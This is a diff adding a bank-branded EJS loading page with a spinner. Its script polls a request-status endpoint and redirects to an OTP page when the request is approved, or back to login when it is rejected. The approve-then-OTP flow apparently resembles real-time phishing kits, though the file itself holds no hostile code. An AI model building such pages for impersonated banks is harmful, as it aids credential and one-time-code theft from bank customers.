@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="<%= lang %>" dir="<%= lang === 'ar' ? 'rtl' : 'ltr' %>">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title><%= t.loadingTitle %> - <%= t.bankName %></title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: linear-gradient(135deg, #c8a84e 0%, #d4af37 25%, #f0d060 50%, #d4af37 75%, #c8a84e 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .loading-container {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 16px;
+            padding: 50px 30px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            text-align: center;
+        }
+        .loading-logo {
+            margin-bottom: 30px;
+        }
+        .loading-logo img {
+            width: 180px;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #eee;
+            border-top: 4px solid #d4af37;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 25px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-text {
+            color: #555;
+            font-size: 16px;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-container">
+        <div class="loading-logo">
+            <img src="/images/logo-gold.png" alt="<%= t.bankName %>">
+        </div>
+        <div class="spinner"></div>
+        <p class="loading-text"><%= t.loadingText %></p>
+    </div>
+
+    <script>
+    (function() {
+        var params = new URLSearchParams(window.location.search);
+        var lang = params.get('lang') || 'ar';
+        var orderId = params.get('orderId');
+
+        function checkStatus() {
+            fetch('/api/requests/' + orderId + '/check')
+            .then(function(r) { return r.json(); })
+            .then(function(d) {
+                if (d.ok) {
+                    if (d.status === 'approved') {
+                        window.location.href = '/otp?lang=' + lang + '&orderId=' + orderId;
+                    } else if (d.status === 'rejected') {
+                        window.location.href = '/login?lang=' + lang + '&orderId=' + orderId + '&error=1';
+                    }
+                }
+            })
+            .catch(function(){});
+        }
+
+        setInterval(checkStatus, 3000);
+    })();
+    </script>
+</body>
+</html>
